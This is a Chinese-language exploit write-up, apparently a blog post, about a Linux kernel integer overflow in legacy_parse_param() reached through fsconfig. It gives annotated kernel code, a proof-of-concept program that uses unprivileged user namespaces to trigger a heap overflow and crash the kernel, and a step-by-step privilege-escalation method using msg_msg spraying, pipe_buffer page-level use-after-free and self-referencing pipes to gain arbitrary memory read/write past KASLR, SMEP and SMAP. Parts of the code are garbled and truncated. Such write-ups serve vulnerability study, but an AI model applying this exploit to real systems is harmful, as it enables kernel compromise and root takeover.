
```c
return invalf(fc, "VFS: Legacy: Non-string source");

if (fc->source)
    return invalf(fc, "VFS: Legacy: Multiple sources");

fc->source = param->string;
param->string = NULL;
return 0;
}

if (ctx->param_type == LEGACY_FS_MONOLITHIC_PARAMS)
    return invalf(fc, "VFS: Legacy: Can't mix monolithic and individual options");

// 计算 len
switch (param->type) {
case fs_value_is_string: // 对应 FSCONFIG_SET_STRING
    len = 1 + param->size;
    /* Fall through */
case fs_value_is_flag:
    len += strlen(param->key);
    break;
default:
    return invalf(fc, "VFS: Legacy: Parameter type for '%s' not supported",
                  param->key);
}

// 此处存在整型溢出的漏洞，若 size + 2 大于一张页的大小则会上溢为一个较大的无符号整型，
// 导致此处通过检查，从而导致后续步骤中的越界拷贝
if (len > PAGE_SIZE - 2 - size)
    return invalf(fc, "VFS: Legacy: Cumulative options too large");

if (strchr(param->key, ',') ||
    (param->type == fs_value_is_string &&
     memchr(param->string, ',', param->size)))
    return invalf(fc, "VFS: Legacy: Option '%s' contained comma",
                  param->key);
```

在后面的流程中会从用户控件将数据拷贝到 `ctx->legacy_data` 上，而 `ctx->legacy_data` 仅分配了一张页面大小，但后续流程中的拷贝是从 `ctx->legacy_data[size]` 开始的，由于 `size` 可以大于一张页大小，因此此处可以发生数据数据写入，由于 `ctx->legacy_data` 在分配时使用的是通用的分配 flag `GFP_KERNEL`，因此可以溢出到绝大多数的常用结构体中

```c
// 为 legacy_data 分配一张页的大小
if (!ctx->legacy_data) {
    ctx->legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL);
    if (!ctx->legacy_data)
        return -ENOMEM;
}

ctx->legacy_data[size++] = ',';
len = strlen(param->key);
// size 可以大于一张页，但是 legacy_data 只有一张页，从而导致了越界拷贝
memcpy(ctx->legacy_data + size, param->key, len);
size += len;
if (param->type == fs_value_is_string) {
    ctx->legacy_data[size++] = '=';
    // size 可以大于一张页，但是 legacy_data 只有一张页，从而导致了越界拷贝
    memcpy(ctx->legacy_data + size, param->string, param->size);
    size += param->size;
}
ctx->legacy_data[size] = '\0';
ctx->data_size = size;
ctx->param_type = LEGACY_FS_INDIVIDUAL_PARAMS;
return 0;
}
```

这里需要注意的是，由于 `fsconfig` 的限制，我们单次写入的最大长度为 256 字节，因此我们需要多次调用 `fsconfig` 以让其逐渐逼近 `PAGE_SIZE`，而 `len > PAGE_SIZE - 2 - size` 的检查并非完全无效，由于 `size` 为已拷贝数据长度而 `len` 为待拷贝数据长度，因此只有当 `size` 累加到 4095 时才会发生整型溢出，这里我们在进行溢出前需要卡好已拷贝数据长度刚好为 4095

由于 `legacy_parse_param()` 中拷贝的结果形式为 `",key=val"`，故我们有如下计算公式：

- 单次拷贝数据长度 = `len(key) + len(val) + 2`

下面笔者给出一个笔者自己计算的 4095：

```c
/**
 * fulfill the ctx->legacy_data to 4095 bytes,
 * so that the (PAGE_SIZE - 2 - size) overflow
 */
for (int i = 0; i
```

## Proof of Concept

由于大部分的文件系统类型都未设置 `init_fs_context`，因此最后都可以走到 `legacy_parse_param()` 的流程当中，例如 `ext4` 文件系统的 `file_system_type` 定义如下：

```c
static struct file_system_type ext4_fs_type = {
    .owner      = THIS_MODULE,
    .name       = "ext4",
    .mount      = ext4_mount,
    .kill_sb    = kill_block_super,
    .fs_flags   = FS_REQUIRES_DEV,
};
```

这里我们将通过 `ext4` 文件系统进行漏洞复现，我们只需要越界写足够长的一块内存，通常都能写到一些内核结构体从而导致 kernel panic

需要注意的是 filesystem mount API 需要命名空间具有 `CAP_SYS_ADMIN` 权限，但由于其仅检查命名空间权限，故对于没有该权限的用户则可以通过 `unshare(CLONE_NEWNS|CLONE_NEWUSER)` 创建新的命名空间，以在新的命名空间内获取对应权限

```c
#define _GNU_SOURCE

#include

#include

#include

#include

#include

-

#include

#include

#include

#include

#include

#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif

#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif

int fsopen(const char *fs_name, unsigned int flags)
{
    return syscall(__NR_fsopen, fs_name, flags);
}

int fsconfig(int fsfd, unsigned int cmd,
             const char *key, const void *val, int aux)
{
    return syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);
}

void errExit(char *msg)
{
    printf("\033[31m\033[1m[x] Error: %s\033[0m\n", msg);
    exit(EXIT_FAILURE);
}

int main(int argc, char **argv, char **envp)
{
    int fs_fd;

    /* create new namespace to get CAP_SYS_ADMIN */
    unshare(CLONE_NEWNS | CLONE_NEWUSER);

    /* get a filesystem context */
    fs_fd = fsopen("ext4", 0);

    if (fs_fd legacy_data to 4095 bytes,

     * so that the (PAGE_SIZE - 2 - size) overflow
     */
    for (int i = 0; i
```

运行，成功通过堆溢出造成 kernel panic：

![](https://s2.loli.net/2023/01/08/KmX1LNFrDQPpd9u.png)

## 0x02. 漏洞利用

下面笔者给出两种利用方法，其中第一种方法已经经过笔者验证，第二种方法是由漏洞发现者提出的利用方法，尚未经过笔者验证（不过理论上可行）

### 方法一、覆写 pipe_buffer 构造页级 UAF

正如笔者在 [https://www.52pojie.cn/thread-1784403-1-1.html](https://www.52pojie.cn/thread-1784403-1-1.html) 中所言，强大的 `pipe_buffer` 利用技术允许我们将绝大多数的内核中的内存损坏漏洞（甚至仅是一个 `'\0'` 字节的堆溢出）转换为无需任何特权的无限的对物理内存的任意读写能力，并能完美绕过包括 KASLR、SMEP、SMAP 在内的多项主流缓解措施，因此笔者选择使用这项技术完成漏洞利用

#### Step.I - 堆喷 msg_msg 定位溢出位置

由于下次写入必定会向下一个对象内写入一个 `'='` 和一个 `'\0'` ，而这个 `'='` 就很不可爱，因此我们选择不直接利用与其相邻的第一个 4k 对象，而是覆写与其相邻的第二个 4k 对象，这样我们便能只向第二个 4k 对象内写入一个可爱的 `\x00` ：）

这里笔者选择首先堆喷 `msg_msg`，利用漏洞将 `m_ts` 改大，通过 `MSG_COPY` 读取检查被覆写的 `msg_msg` 并释放除了该 `msg_msg` 以外的其他 `msg_msg`

#### Step.II - fcntl(F_SETPIPE_SZ) 更改 pipe_buffer 所在 slub 大小，构造页级 UAF

接下来我们考虑溢出的目标对象，现在我们仅想要使用一个 `\x00` 字节完成利用，毫无疑问的是我们需要寻找一些在结构体头部便有指向其他内核对象的指针的内核对象，我们不难想到的是 `pipe_buffer` 是一个非常好的的利用对象，其开头有着指向 `page` 结构体的指针，而 `page` 的大小仅为 `0x40` ，可以被 `0x100` 整除，若我们能够通过 partial overwrite 使得两个管道指向同一张页面，并释放掉其中一个，我们便构造出了页级的 UAF：

![](https://s2.loli.net/2023/05/02/JLZOKejgoPdTkYA.png)

![](https://s2.loli.net/2023/05/02/MwTSWUbeaY9Puro.png)

![](https://s2.loli.net/2023/05/02/R3reNIAT1lG7sfw.png)

同时管道的特性还能让我们在 UAF 页面上任意读写，这真是再美妙不过了：）

但是有一个小问题，`pipe_buffer` 来自于 `kmalloc-cg-1k` ，其会请求 order-2 的页面，而漏洞对象大小为 4k，其会请求 order-3 的页面，如果我们直接进行不同 order 间的堆风水的话，则利用成功率会大打折扣 :（

但 pipe 可以被挖掘的潜力远比我们想象中大得多：）现在让我们重新审视 `pipe_buffer` 的分配过程，其实际上是单次分配 `pipe_bufs` 个 `pipe_buffer` 结构体：

```c
struct pipe_inode_info *alloc_pipe_info(void)
{
    //...

    pipe->bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer),
                 GFP_KERNEL_ACCOUNT);
```

这里注意到 `pipe_buffer` 不是一个常量而是一个变量，那么我们能否有方法修改 `pipe_buffer` 的数量？答案是肯定的，pipe 系统调用非常贴心地为我们提供了 `F_SETPIPE_SZ` 让我们可以重新分配 `pipe_buffer` 并指定其数量：

```c
long pipe_fcntl(struct file *file, unsigned int cmd, unsigned long arg)
{
    struct pipe_inode_info *pipe;
    long ret;
    pipe = get_pipe_info(file, false);
    if (!pipe)
        return -EBADF;
    __pipe_lock(pipe);
    switch (cmd) {
    case F_SETPIPE_SZ:
        ret = pipe_set_size(pipe, arg);
//...
static long pipe_set_size(struct pipe_inode_info *pipe, unsigned long arg)
{
    //...
    ret = pipe_resize_ring(pipe, nr_slots);
//...
int pipe_resize_ring(struct pipe_inode_info *pipe, unsigned int nr_slots)
{
    struct pipe_buffer *bufs;
    unsigned int head, tail, mask, n;
    bufs = kcalloc(nr_slots, sizeof(*bufs),
               GFP_KERNEL_ACCOUNT | __GFP_NOWARN);
```

那么我们不难想到的是我们可以通过 `fcntl()` 重新分配单个 pipe 的 `pipe_buffer` 数量，：

- 对于每个 pipe 我们指定分配 64 个 `pipe_buffer`，从而使其向 `kmalloc-cg-2k` 请求对象，而这将最终向 buddy system 请求 order-3 的页面

由此，我们便成功使得 `pipe_buffer` 与题目模块的对象处在同一 order 的内存页上，从而提高 cross-cache overflow 的成功率

不过需要注意的是，由于 `page` 结构体的大小为 `0x40`，其可以被 `0x100` 整除，因此若我们所溢出的目标 page 的地址最后一个字节刚好为 `\x00`，那就等效于没有溢出，因此实际上利用成功率仅为 75% （悲）

#### Step.III - 构造二级自写管道，实现任意内存读写

有了 page-level UAF，我们接下来考虑向这张页面分配什么结构体作为下一阶段的 victim object

由于管道本身便提供给我们读写的功能，而我们又能够调整 `pipe_buffer` 的大小并重新分配结构体，那么再次选择 `pipe_buffer` 作为 victim object 便是再自然不过的事情：）

![](https://s2.loli.net/2023/05/02/lfmP8ZxicbjBNSR.png)

接下来我们可以通过 UAF 管道读取 `pipe_buffer` 内容，从而泄露出 `page`、`pipe_buf_operations` 等有用的数据（可以在重分配前预先向管道中写入一定长度的内容，从而实现数据读取），由于我们可以通过 UAF 管道直接改写 `pipe_buffer` ，因此将漏洞转化为 dirty pipe 或许会是一个不错的办法（这也是本次比赛中 NU1L 战队的解法）

但是 pipe 的强大之处远不止这些，由于我们可以对 UAF 页面上的 `pipe_buffer` 进行读写，我们可以继续构造出第二级的 page-level UAF：

![](https://s2.loli.net/2023/05/02/yhNuT7kBj58K6gt.png)

为什么要这么做呢？在第一次 UAF 时我们获取到了 `page` 结构体的地址，而 `page` 结构体的大小固定为 `0x40`，且与物理内存页一一对应，试想若是我们可以不断地修改一个 pipe 的 `page` 指针，则我们便能完成对整个内存空间的任意读写，因此接下来我们要完成这样的一个利用系统的构造

再次重新分配 `pipe_buffer` 结构体到第二级 page-level UAF 页面上，由于这张物理页面对应的 `page` 结构体的地址对我们而言是已知的，我们可以直接让这张页面上的 `pipe_buffer` 的 `page` 指针指向自身，从而直接完成对自身的修改：

![](https://s2.loli.net/2023/05/02/TYr8WlEushem2i3.png)
